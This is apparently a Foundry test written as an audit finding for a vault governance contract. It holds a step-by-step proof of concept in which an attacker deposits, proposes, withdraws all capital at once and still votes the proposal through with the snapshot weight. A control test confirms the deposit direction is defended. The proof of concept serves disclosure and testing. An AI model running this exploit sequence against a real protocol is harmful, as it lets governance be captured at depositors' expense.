// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {VaultCore} from "../../src/VaultCore.sol";
import {Governance} from "../../src/Governance.sol";
import {MockERC20, MockOracle, StubFeeEngine, StubRegistry} from "../mocks/Mocks.sol";

/// @notice AUDIT ARTIFACT — not a protocol test.
///
/// Governance reads every weight at `p.createdAt - 1`
/// (`src/Governance.sol:269, 299, 326, 393`), and `Checkpoints.getAt` returns the last
/// checkpoint at or before that timestamp (`src/lib/Checkpoints.sol:36-45`). A checkpoint
/// written when a member EXITS is stamped at the current block, which is strictly after
/// `createdAt - 1` — so it is invisible to a proposal already in flight.
///
/// Crucially the exit also SETTLES INSTANTLY: `hasPendingExecution` returns
/// `block.timestamp >= p.commitDeadline` for an `Active` proposal (`src/Governance.sol:519-521`),
/// which is FALSE for the entire commit phase. So `requestExit` takes the Mode-I branch
/// (`src/VaultCore.sol:445`, `:453-455`) and pays the member out immediately.
///
/// Net effect: a member can hold stake across ONE block boundary, propose, take all their
/// capital back, and then vote the proposal through with the stake they no longer own — bearing
/// none of the price exposure during the reveal, the timelock, or the execution.
///
/// VO-9 defends the DEPOSIT direction correctly (post-creation stake carries zero weight, and
/// that control test passes below). It says nothing about the WITHDRAWAL direction, which is the
/// profitable one.
contract AuditVoteAfterExitTest is Test {
    uint256 constant USDC_1 = 1e6;
    bytes32 constant SALT = keccak256("salt");

    MockERC20 usdc;
    MockOracle oracle;
    StubFeeEngine fees;
    StubRegistry registry;
    Governance gov;
    VaultCore vault;

    address creator = makeAddr("creator");
    address attacker = makeAddr("attacker");
    address honest = makeAddr("honest");

    function _cfg() internal pure returns (Governance.GovConfig memory) {
        return Governance.GovConfig({
            commitDuration: 6 hours,
            revealDuration: 6 hours,
            timelockDuration: 1 days,
            executionWindow: 2 days,
            quorumBps: 2_500,
            proposalThresholdBps: 500,
            concentrationCapBps: 4_000,
            proposalCooldown: 1 hours
        });
    }

    function setUp() public {
        usdc = new MockERC20("USDC", 6);
        oracle = new MockOracle();
        fees = new StubFeeEngine();
        registry = new StubRegistry();
        gov = new Governance();

        vault = new VaultCore(
            address(usdc),
            new address[](0),
            creator,
            registry,
            gov,
            fees,
            oracle,
            1_000_000_000 * USDC_1,
            10 * USDC_1,
            0, // exitFeeMaxBps = 0 — permitted by VaultCore.sol:214/216
            0,
            new address[](0),
            address(0)
        );

        vm.prank(creator);
        gov.registerVault(address(vault), _cfg());

        // Honest baseline holder.
        usdc.mint(honest, 10_000_000 * USDC_1);
        vm.startPrank(honest);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(1_000 * USDC_1);
        vault.skipWindow();
        vm.stopPrank();

        // Four more small holders, so memberCount >= SIGNER_REGIME_BELOW (5) and the STAKE
        // quorum regime applies — the ordinary case for a real vault.
        for (uint256 i; i < 4; ++i) {
            address m = address(uint160(0xBEEF0000 + i));
            usdc.mint(m, 1_000 * USDC_1);
            vm.startPrank(m);
            usdc.approve(address(vault), type(uint256).max);
            vault.deposit(100 * USDC_1);
            vault.skipWindow();
            vm.stopPrank();
        }

        usdc.mint(attacker, 10_000_000 * USDC_1);
        skip(1);
    }

    /// @notice THE FINDING: stake held for ONE block boundary votes with full weight after being
    /// fully withdrawn, and the withdrawal is instant and complete.
    function test_finding_fullExitRetainsFullVotingWeightOnTheInFlightProposal() public {
        // 1. Acquire a dominant position. skipWindow() is permissionless and unconditional, so
        //    the observation window is bypassed and the deposit mints immediately.
        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vault.skipWindow();
        vault.deposit(9_000 * USDC_1); // 90% of the vault
        vm.stopPrank();

        uint256 balanceAfterDeposit = usdc.balanceOf(attacker);
        uint256 attackerShares = vault.sharesOf(attacker);
        assertGt(attackerShares, 0, "attacker holds stake");

        skip(1); // cross ONE block boundary so the snapshot at createdAt-1 sees the stake

        // 2. Propose.
        vm.prank(attacker);
        uint256 pid = gov.propose(address(vault), Governance.ProposalType.Rebalance, keccak256(""));

        // 3. Immediately take ALL capital back. Still inside the commit phase, so
        //    hasPendingExecution is false and this settles Mode I — instantly, in full.
        assertFalse(gov.hasPendingExecution(address(vault)), "still in commit phase: Mode I");
        vm.prank(attacker);
        vault.requestExit(attackerShares);

        assertEq(vault.sharesOf(attacker), 0, "attacker holds NO shares");
        assertEq(vault.queuedExitShares(attacker), 0, "not queued either - fully settled");
        assertGe(usdc.balanceOf(attacker), balanceAfterDeposit, "capital returned in full");

        // 4. Vote anyway, with the stake they no longer own.
        vm.prank(attacker);
        gov.commitVote(pid, keccak256(abi.encode(pid, attacker, true, SALT)));
        skip(6 hours);
        vm.prank(attacker);
        gov.revealVote(pid, true, SALT); // does NOT revert despite zero current balance

        skip(6 hours);
        gov.finalize(pid);

        assertGt(_forWeight(pid), 0, "an exited member's weight counted toward the tally");
        // memberCount >= 5 at snapshot, so the STAKE regime applies and the attacker's ~86.5%
        // clears the 25% quorum alone.

        // 5. And it passes.
        assertEq(uint256(_status(pid)), uint256(Governance.Status.Passed), "PASSED on withdrawn stake");
    }

    /// @notice CONTROL — VO-9 is correctly implemented in the direction it claims: stake acquired
    /// AFTER proposal creation carries zero weight.
    function test_control_postCreationDepositHasZeroWeight() public {
        vm.prank(honest);
        uint256 pid = gov.propose(address(vault), Governance.ProposalType.Rebalance, keccak256(""));

        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vault.skipWindow();
        vault.deposit(9_000 * USDC_1);
        vm.stopPrank();

        vm.prank(attacker);
        vm.expectRevert(Governance.NoWeight.selector);
        gov.commitVote(pid, keccak256(abi.encode(pid, attacker, true, SALT)));
    }

    /// @dev Proposal tuple order per src/Governance.sol:87-104.
    function _forWeight(uint256 pid) internal view returns (uint256 f) {
        (,,,,,,,,,,,, f,,,) = gov.proposals(pid);
    }

    function _status(uint256 pid) internal view returns (Governance.Status s) {
        (,,,,,,,, s,,,,,,,) = gov.proposals(pid);
    }
}
